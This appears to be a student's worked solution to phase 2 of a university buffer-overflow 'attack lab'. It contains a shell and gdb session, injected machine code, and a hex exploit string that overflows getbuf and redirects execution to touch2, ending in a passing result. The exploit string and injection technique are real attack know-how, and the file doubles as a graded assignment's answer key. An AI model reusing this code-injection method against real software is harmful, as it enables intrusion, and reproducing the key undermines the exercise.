@@ -1,0 +1,112 @@
+// Beware! avoid using comments in the attack code! if you forget a space before or after the "/*" the comment will be treated as part of the buffer!
+
+
+u2 israele4 26 : cd SP2/target8888
+
+u2 israele4 28 : cat > phase2rsp.s
+^C
+
+"
+movq $0x4f3ff3d1,%rdi /* moving my cookie to %rdi register, then return */
+retq
+
+"
+
+u2 israele4 30 : gcc -c phase2rsp.s
+u2 israele4 31 : objdump -d phase2rsp.o  > phase2rsp.d
+
+"
+0000000000000000 <.text>:
+   0:	48 c7 c7 d1 f3 3f 4f 	mov    $0x4f3ff3d1,%rdi
+   7:	c3                   	retq   
+"
+
+//48 c7 c7 d1 f3 3f 4f c3
+
+
+u2 israele4 32 : gdb ctarget
+
+(gdb) b getbuf
+Breakpoint 1 at 0x4016af: file buf.c, line 12.
+
+(gdb) r
+Cookie: 0x4f3ff3d1
+
+Breakpoint 1, getbuf () at buf.c:12
+12      buf.c: No such file or directory.
+        in buf.c
+Missing separate debuginfos, use: debuginfo-install glibc-2.12-1.212.el6_10.3.x86_64
+
+(gdb) disas
+Dump of assembler code for function getbuf:
+=> 0x00000000004016af <+0>:     sub    $0x38,%rsp
+   0x00000000004016b3 <+4>:     mov    %rsp,%rdi
+   0x00000000004016b6 <+7>:     callq  0x4018e7 <Gets>
+   0x00000000004016bb <+12>:    mov    $0x1,%eax
+   0x00000000004016c0 <+17>:    add    $0x38,%rsp
+   0x00000000004016c4 <+21>:    retq
+End of assembler dump.
+
+(gdb) until *0x4016bb
+Type string:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+getbuf () at buf.c:15
+15      in buf.c
+
+(gdb) x/s $rsp
+0x5562b0a8:      'a' <repeats 60 times>
+
+//a8 b0 62 55
+
+(gdb) quit
+
+u2 israele4 33 : cat > phase2sol.txt
+^C
+
+"
+48 c7 c7 d1 f3 3f 4f c3 /* pass my cookie */
+00 00 00 00 00 00 00 00 /* pad with 0x38 bytes = 56 bytes, subtructing 8 bytes that already occupied by the cookie  */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+a8 b0 62 55 00 00 00 00 /* address of %rsp register in little endian */
+f1 16 40 00 00 00 00 00 /* address of touch2 function in little endian */
+"
+
+00000000004016f1 <touch2>:
+  4016f1:	48 83 ec 08          	sub    $0x8,%rsp
+  4016f5:	89 fe                	mov    %edi,%esi
+  4016f7:	c7 05 fb 3d 20 00 02 	movl   $0x2,0x203dfb(%rip)        # 6054fc <vlevel>
+  4016fe:	00 00 00 
+  401701:	39 3d fd 3d 20 00    	cmp    %edi,0x203dfd(%rip)        # 605504 <cookie>
+  401707:	74 23                	je     40172c <touch2+0x3b>
+  401709:	bf c8 2f 40 00       	mov    $0x402fc8,%edi
+  40170e:	b8 00 00 00 00       	mov    $0x0,%eax
+  401713:	e8 28 f5 ff ff       	callq  400c40 <printf@plt>
+  401718:	bf 02 00 00 00       	mov    $0x2,%edi
+  40171d:	e8 8f 05 00 00       	callq  401cb1 <fail>
+  401722:	bf 00 00 00 00       	mov    $0x0,%edi
+  401727:	e8 74 f6 ff ff       	callq  400da0 <exit@plt>
+  40172c:	bf a0 2f 40 00       	mov    $0x402fa0,%edi
+  401731:	b8 00 00 00 00       	mov    $0x0,%eax
+  401736:	e8 05 f5 ff ff       	callq  400c40 <printf@plt>
+  40173b:	bf 02 00 00 00       	mov    $0x2,%edi
+  401740:	e8 ba 04 00 00       	callq  401bff <validate>
+  401745:	eb db                	jmp    401722 <touch2+0x31>
+  
+
+//touch2 address
+4016f1
+f1 16 40
+
+
+u2 israele4 34 : ./hex2raw < phase2sol.txt > phase2raw.txt
+u2 israele4 39 : ./ctarget < phase2raw.txt
+Cookie: 0x4f3ff3d1
+Type string:Touch2!: You called touch2(0x4f3ff3d1)
+Valid solution for level 2 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
+
